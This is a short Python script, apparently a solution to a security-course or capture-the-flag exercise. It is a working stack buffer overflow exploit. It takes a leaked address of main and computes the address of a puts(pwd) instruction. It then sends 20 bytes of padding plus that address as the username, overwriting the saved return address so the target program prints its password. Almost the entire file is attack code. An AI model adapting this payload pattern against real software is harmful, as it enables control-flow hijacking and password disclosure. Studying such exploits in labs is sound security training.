#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    assert isinstance(v, bytes)
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# Here we have the address of the main function.
pmain = int(sys.stdin.readline(), 16)

# Offset from main to the puts(pwd) instruction inside check_user
# Found via: p (char*)&check_user + (0x1254 - 0x11e9) - (char*)&main = -22
offset_main_to_puts_pwd = -22

# Offset from &name to saved rip inside check_user
# saved rip at 0x7fffffffd418, &name at 0x7fffffffd404, 20 bytes
offset_name_to_rip = 20

# Compute runtime address of the puts(pwd) instruction
p_puts_pwd = pmain + offset_main_to_puts_pwd

eprint(f"pmain       = {hex(pmain)}")
eprint(f"p_puts_pwd  = {hex(p_puts_pwd)}")

# Build payload: padding to reach saved rip, then overwrite with puts(pwd) address
payload = b"A" * offset_name_to_rip + p_puts_pwd.to_bytes(8, 'little')

writeBytes(payload + b"\n")   # username: overflows into saved rip
writeStr("wrongpassword\n")    # password: wrong, but doesn't matter
